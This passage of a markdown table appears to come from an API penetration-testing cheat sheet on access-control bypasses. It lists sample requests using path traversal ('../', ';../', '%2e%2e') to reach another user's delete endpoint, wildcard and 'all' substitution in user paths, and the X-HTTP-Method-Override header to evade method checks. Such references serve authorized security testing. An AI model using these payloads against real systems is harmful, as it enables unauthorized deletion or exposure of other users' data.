...
| **Path Traversal / Mixed Paths** | `POST /users/delete/my_id/../victim_id` `POST /users/delete/my_id/;../victim_id` `POST /users/delete/my_id/%2e%2e/victim_id` |
| **Wildcard Substitution** | `GET /api/users/*` or `GET /api/users/user_id` |
| **Keywords in Path** | `GET /api/v3/users/12345` -> `/api/v3/users/all` |
...
| **X-HTTP-Method-Override header** | `X-HTTP-Method-Override: DELETE (GET, POST, PATCH, PUT)` to bypass method checks. |
